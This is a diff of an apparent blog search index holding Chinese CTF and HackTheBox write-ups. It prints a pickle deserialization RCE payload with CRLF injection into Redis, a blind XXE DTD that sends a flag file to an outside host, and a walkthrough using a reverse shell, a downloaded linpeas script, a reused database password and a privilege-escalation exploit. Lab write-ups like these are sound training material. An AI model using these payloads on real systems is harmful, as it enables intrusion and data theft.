@@ -1,6 +1,164 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2024高校网络安全管理运维赛-easyshell</title>
+    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell.html</url>
+    <content><![CDATA[<p>冰蝎流量分析</p>
+<span id="more"></span>
+
+<p>打开附件，筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==192.168.33.102</span><br></pre></td></tr></table></figure>
+
+<p>追踪tcp流，发现具有冰蝎流量的特征</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225011235.png"></p>
+<p>导出http对象，保存到本地</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225053452.png"></p>
+<p>将shell.php内容丢到<a href="http://tools.bugscaner.com/cryptoaes/">在线网站</a>解密，这里密钥就直接猜默认密钥</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506224735752.png"></p>
+<p>在第十个shell.php进行解密后再base64两次发现是PK头</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225825504.png"></p>
+<p>保存为zip文件后爆破密码<code>A8s123/+*</code>，解压后得到flag</p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>冰蝎</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024高校网络安全管理运维赛-web</title>
+    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web.html</url>
+    <content><![CDATA[<p>代表福师大参加运维赛，还好最后十分钟解出来pyssrf呜呜呜</p>
+<span id="more"></span>
+
+
+
+<h2 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h2><p>源码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">from redis import Redis</span><br><span class="line">import hashlib</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=&#x27;127.0.0.1&#x27;, port=6379)</span><br><span class="line"></span><br><span class="line">def get_result(url):</span><br><span class="line">    url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">    res=redis.get(url_key)</span><br><span class="line">    if res:</span><br><span class="line">        return pickle.loads(base64.b64decode(res))</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            print(url)</span><br><span class="line">            info = urllib.request.urlopen(url)</span><br><span class="line">            res = info.read()</span><br><span class="line">            pickres=pickle.dumps(res)</span><br><span class="line">            b64res=base64.b64encode(pickres)</span><br><span class="line">            redis.set(url_key,b64res,ex=300)</span><br><span class="line">            return res</span><br><span class="line">        except urllib.error.URLError as e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    return &#x27;&#x27;&#x27;&lt;h1&gt;give me your url via GET method like: ?url=127.0.0.1:8080&lt;h1&gt;</span><br><span class="line">    &lt;h2&gt;Here is your result&lt;/h2&gt;</span><br><span class="line">    &lt;h3&gt;source code in /source&lt;/h3&gt;</span><br><span class="line">    %s</span><br><span class="line">    &#x27;&#x27;&#x27; % get_result(&#x27;http://&#x27;+url).decode(encoding=&#x27;utf8&#x27;,errors=&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/source&#x27;)</span><br><span class="line">def source():</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>
+
+<p>分析源码，注意到<code>get_result()</code>函数有pickle反序列化</p>
+<p>往前分析，前提是在连接redis的时候需要匹配到url_key键名</p>
+<p>并且注意到存在urllib头部注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info = urllib.request.urlopen(url)</span><br></pre></td></tr></table></figure>
+
+<p><strong>思路</strong></p>
+<blockquote>
+<p>先访问url生成键名，然后利用urllib头部注入设置该键名值为pickle的payload，最后再访问该键名（也就是<code>127.0.0.1:6379</code>）</p>
+</blockquote>
+<p>我们先访问在题目生成键名（这里对应的是<code>http:127.0.0.1:6379</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379</span><br></pre></td></tr></table></figure>
+
+<p>然后在本地运行脚本生成对应MD5值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import hashlib</span><br><span class="line">from flask import Flask,request</span><br><span class="line">url=&#x27;http://127.0.0.1:6379&#x27;</span><br><span class="line">url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">print(url_key)</span><br></pre></td></tr></table></figure>
+
+<p>利用报错回显，pickle反序列化exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;,))</span><br><span class="line"> </span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
+
+<p>然后利用urllib头部注入修改前面键名的值为payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379?</span><br><span class="line">set cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p>丢到cyberchef编码一下</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506213415136.png"></p>
+<p>直接传payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379?%0d%0aset cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0d%0asave</span><br></pre></td></tr></table></figure>
+
+<p>然后再访问<code>127.0.0.1:6379</code>就可以看到修改后的flag</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506205730515.png"></p>
+<h2 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h2><blockquote>
+<p>xxe无回显</p>
+</blockquote>
+<p>bp抓包修改POST请求方式，添加数据（注意content-type为xml）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &#x27;http://5i781963p2.yicp.fun:80/test.dtd&#x27;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194841777.png"></p>
+<p>test.dtd文件（注意<code>%</code>要改成<code>&amp;#37;</code>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://5i781963p2.yicp.fun:80?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>本地开启http服务，成功外带flag</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194620542.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>SSRF</tag>
+        <tag>pickle反序列化</tag>
+        <tag>CRLF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BoardLight-HackTheBox</title>
+    <url>/article/BoardLight-HackTheBox.html</url>
+    <content><![CDATA[<p>Dolibarr 代码执行漏洞、Enlightenment组件权限提升漏洞</p>
+<span id="more"></span>
+
+<h1 id="BoardLight-HackTheBox"><a href="#BoardLight-HackTheBox" class="headerlink" title="BoardLight-HackTheBox"></a>BoardLight-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.11</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>80端口有http服务并且为apache中间件，尝试访问一下</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240530212903125.png" alt="image-20240530212903125"></p>
+<p>拉到最下面得到域名信息<code>board.htb</code>，添加到hosts文件中成功访问</p>
+<p>爆破下子域名，得到<code>crm.board.htb</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://board.htb/ -w /home/rev1ve/shentou/dict/zi-yu-ming/subdomains-10000.txt --append-domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240530214310012.png" alt="image-20240530214310012"></p>
+<p>同理添加到hosts文件即可访问，注意到<code>Dolibarr 17.0.0</code></p>
+<p>不过大部分漏洞都要登录到后台界面才能利用，猜测存在admin用户</p>
+<p>burpsuite爆破密码得到admin，直接进行登录</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240530225345286.png" alt="image-20240530225345286"></p>
+<p>去阿里云漏洞库搜索，可利用漏洞如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2023-4197: Dolibarr ERP CRM (&lt;= 18.0.1) 不正确的输入清理验证 RCE</span><br><span class="line">CVE-2023-38888: Dolibarr ERP CRM 中的跨站脚本漏洞</span><br><span class="line">CVE-2023-4198: Dolibarr ERP CRM (&lt;= 17.0.3) 访问控制不当</span><br><span class="line">CVE-2023-30253: Dolibarr 代码执行漏洞</span><br><span class="line">CVE-2023-38886: Dolibarr 允许远程特权攻击者通过精心设计的命令/脚本执行任意代码</span><br><span class="line">CVE-2023-38887: Dolibarr ERP CRM 中的文件上传漏洞</span><br><span class="line">CVE-2023-5323: 跨站脚本 (XSS) - dolibarr/dolibarr 中的通用</span><br><span class="line">CVE-2024-23817: Dolibarr 应用程序主页 HTML 注入漏洞</span><br><span class="line">CVE-2024-29477: Dolibarr ERP CRM 安装过程中的代码注入漏洞</span><br><span class="line">CVE-2024-31503: Dolibarr 容易遭受跨站请求伪造</span><br></pre></td></tr></table></figure>
+
+<p>CVE-2023-4197、CVE-2023-4198利用失败</p>
+<p>在测试CVE-2023-30253的时候搜到网上现成的poc <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">脚本链接</a></p>
+<p>直接反弹shell到本机</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240530231214626.png" alt="image-20240530231214626"></p>
+<p>经过一番查找，在<code>~/html/crm.board.htb/htdocs/conf</code>路径下找到敏感文件conf.php</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240601102008593.png" alt="image-20240601102008593"></p>
+<p>这里要先提升为完全交互式shell，不然后面连接数据库输入密码没反应</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>尝试本地mysql登录，密码为<code>serverfun2$2023!!</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dolibarrowner -p -h localhost</span><br></pre></td></tr></table></figure>
+
+<p>连接成功后找到表<code>llx_user</code>，查询用户信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select login,pass_crypted from llx_user;</span><br></pre></td></tr></table></figure>
+
+<p>查询结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| login    | pass_crypted                                                 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br><span class="line">| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm |</span><br><span class="line">| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |</span><br><span class="line">+----------+--------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>不过用john都爆不出来，私钥文件也找不到</p>
+<p>之前有在<code>/home</code>下看到larissa用户，尝试用上面得到的数据库密码去ssh连接</p>
+<p>拿到user的flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240601111112563.png" alt="image-20240601111112563"></p>
+<p>经过一番查找，发现常见的提权方式比如sudo都不太行</p>
+<p>于是上传linpeas去自动化探测漏洞（在本机开启http服务）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.88/linpeas.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后chmod给个执行权限直接执行</p>
+<p>发现存在0.23.1版本的enlightenment组件</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240601220215406.png" alt="image-20240601220215406"></p>
+<p>网上搜索找到利用enlightenment_sys二进制文件去权限提升的洞 <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">参考文章</a></p>
+<p><strong>Enlightenment组件权限提升漏洞</strong></p>
+<blockquote>
+<p>Enlightenment 0.25.4之前版本中的enlightenment_sys允许本地用户获得特权，因为它是setuid root，并且系统库函数错误处理以&#x2F;dev&#x2F;.开始的路径名</p>
+</blockquote>
+<p>用参考文章的exp打就行，得到root的flag</p>
+<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240601220653063.png" alt="image-20240601220653063"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2018信息安全铁人三项数据赛</title>
     <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
     <content><![CDATA[<p>记录一些铁三的流量分析题</p>
@@ -100,148 +258,6 @@
       </tags>
   </entry>
   <entry>
-    <title>2024高校网络安全管理运维赛-easyshell</title>
-    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell.html</url>
-    <content><![CDATA[<p>冰蝎流量分析</p>
-<span id="more"></span>
-
-<p>打开附件，筛选一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==192.168.33.102</span><br></pre></td></tr></table></figure>
-
-<p>追踪tcp流，发现具有冰蝎流量的特征</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225011235.png"></p>
-<p>导出http对象，保存到本地</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225053452.png"></p>
-<p>将shell.php内容丢到<a href="http://tools.bugscaner.com/cryptoaes/">在线网站</a>解密，这里密钥就直接猜默认密钥</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506224735752.png"></p>
-<p>在第十个shell.php进行解密后再base64两次发现是PK头</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225825504.png"></p>
-<p>保存为zip文件后爆破密码<code>A8s123/+*</code>，解压后得到flag</p>
-]]></content>
-      <categories>
-        <category>流量分析</category>
-      </categories>
-      <tags>
-        <tag>冰蝎</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024高校网络安全管理运维赛-web</title>
-    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web.html</url>
-    <content><![CDATA[<p>代表福师大参加运维赛，还好最后十分钟解出来pyssrf呜呜呜</p>
-<span id="more"></span>
-
-
-
-<h2 id="pyssrf"><a href="#pyssrf" class="headerlink" title="pyssrf"></a>pyssrf</h2><p>源码如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">from redis import Redis</span><br><span class="line">import hashlib</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=&#x27;127.0.0.1&#x27;, port=6379)</span><br><span class="line"></span><br><span class="line">def get_result(url):</span><br><span class="line">    url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">    res=redis.get(url_key)</span><br><span class="line">    if res:</span><br><span class="line">        return pickle.loads(base64.b64decode(res))</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            print(url)</span><br><span class="line">            info = urllib.request.urlopen(url)</span><br><span class="line">            res = info.read()</span><br><span class="line">            pickres=pickle.dumps(res)</span><br><span class="line">            b64res=base64.b64encode(pickres)</span><br><span class="line">            redis.set(url_key,b64res,ex=300)</span><br><span class="line">            return res</span><br><span class="line">        except urllib.error.URLError as e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def hello():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    return &#x27;&#x27;&#x27;&lt;h1&gt;give me your url via GET method like: ?url=127.0.0.1:8080&lt;h1&gt;</span><br><span class="line">    &lt;h2&gt;Here is your result&lt;/h2&gt;</span><br><span class="line">    &lt;h3&gt;source code in /source&lt;/h3&gt;</span><br><span class="line">    %s</span><br><span class="line">    &#x27;&#x27;&#x27; % get_result(&#x27;http://&#x27;+url).decode(encoding=&#x27;utf8&#x27;,errors=&#x27;ignore&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/source&#x27;)</span><br><span class="line">def source():</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>
-
-<p>分析源码，注意到<code>get_result()</code>函数有pickle反序列化</p>
-<p>往前分析，前提是在连接redis的时候需要匹配到url_key键名</p>
-<p>并且注意到存在urllib头部注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info = urllib.request.urlopen(url)</span><br></pre></td></tr></table></figure>
-
-<p><strong>思路</strong></p>
-<blockquote>
-<p>先访问url生成键名，然后利用urllib头部注入设置该键名值为pickle的payload，最后再访问该键名（也就是<code>127.0.0.1:6379</code>）</p>
-</blockquote>
-<p>我们先访问在题目生成键名（这里对应的是<code>http:127.0.0.1:6379</code>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379</span><br></pre></td></tr></table></figure>
-
-<p>然后在本地运行脚本生成对应MD5值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import hashlib</span><br><span class="line">from flask import Flask,request</span><br><span class="line">url=&#x27;http://127.0.0.1:6379&#x27;</span><br><span class="line">url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">print(url_key)</span><br></pre></td></tr></table></figure>
-
-<p>利用报错回显，pickle反序列化exp如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">class A():</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;,))</span><br><span class="line"> </span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">print(base64.b64encode(b))</span><br></pre></td></tr></table></figure>
-
-<p>然后利用urllib头部注入修改前面键名的值为payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379?</span><br><span class="line">set cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-<p>丢到cyberchef编码一下</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506213415136.png"></p>
-<p>直接传payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=127.0.0.1:6379?%0d%0aset cbdecc92165b29374b6b62cca016d4f8 gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCAvZmxhZycpLnJlYWQoKSmUhZRSlC4=%0d%0asave</span><br></pre></td></tr></table></figure>
-
-<p>然后再访问<code>127.0.0.1:6379</code>就可以看到修改后的flag</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506205730515.png"></p>
-<h2 id="fileit"><a href="#fileit" class="headerlink" title="fileit"></a>fileit</h2><blockquote>
-<p>xxe无回显</p>
-</blockquote>
-<p>bp抓包修改POST请求方式，添加数据（注意content-type为xml）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &#x27;http://5i781963p2.yicp.fun:80/test.dtd&#x27;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194841777.png"></p>
-<p>test.dtd文件（注意<code>%</code>要改成<code>&amp;#37;</code>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://5i781963p2.yicp.fun:80?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>本地开启http服务，成功外带flag</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-web/image-20240506194620542.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>SSRF</tag>
-        <tag>pickle反序列化</tag>
-        <tag>CRLF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Brutus-HackTheBox</title>
-    <url>/article/Brutus-HackTheBox.html</url>
-    <content><![CDATA[<p>wtmp日志文件</p>
-<span id="more"></span>
-
-
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><blockquote>
-<p>在这个非常简单的 Sherlock 中，您将熟悉 Unix auth.log 和 wtmp 日志。我们将探讨通过 SSH 服务对 Confluence  服务器进行暴力破解的场景。获得服务器访问权限后，攻击者执行了其他活动，我们可以使用 auth.log 进行跟踪。尽管 auth.log  主要用于暴力分析，但我们将在调查中深入研究此工件的全部潜力，包括权限升级、持久性，甚至对命令执行的一些可见性。</p>
-</blockquote>
-<h1 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h1><p><strong>通过分析auth.log，能否识别出攻击者进行暴力攻击所使用的IP地址？</strong></p>
-<p>打开日志文件，发现ip为<code>65.2.161.68</code>在尝试登录admin用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223335647.png"></p>
-<h1 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h1><p><strong>暴力尝试成功，攻击者获得了服务器上帐户的访问权限。该帐户的用户名是什么？</strong></p>
-<p>我们在对成功登录的日志记录下来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2</span><br><span class="line">Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2</span><br><span class="line">Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2</span><br></pre></td></tr></table></figure>
-
-<p>不难发现第二次和第三次是攻击者登录的，对应ip为<code>65.2.161.68</code></p>
-<p>所以在尝试连续的爆破密码后，成功登录的是root用户</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421223811885.png"></p>
-<h1 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h1><p><strong>您能否识别攻击者手动登录服务器以实现其目标的时间戳？</strong></p>
-<p>在前一问可以知道<code>65.2.161.68</code>为攻击者ip，再来看看题目给的wtmp文件</p>
-<blockquote>
-<p><code>wtmp</code> 是跟踪 Linux 系统上登录和注销事件的三个文件之一。 <code>/var/run/utmp</code> 跟踪当前登录的用户。 <code>/var/log/wtmp</code> 保留登录和注销活动的历史日志。 <code>/var/log/btmp</code> 保留无效登录尝试的记录。</p>
-</blockquote>
-<p>我们用工具utmpdump打开，可以看到<code>65.2.161.68</code>进行了root用户登录，也就是说是攻击者手动登陆的</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-06 06:32:45</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Brutus-HackTheBox/image-20240421224859079.png"></p>
-<h1 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h1><p><strong>SSH 登录会话会被跟踪并在登录时分配一个session。对于问题 2 中的用户帐户，分配给攻击者会话的session是多少？</strong></p>
-<p>我们在前面分析过<code>06:32:45</code>为攻击者登录时间，所以分析log日志文件后得到session为37</p>
-<p><img src="/article/Brutus-HackTheBox/image-20240421230448152.png"></p>
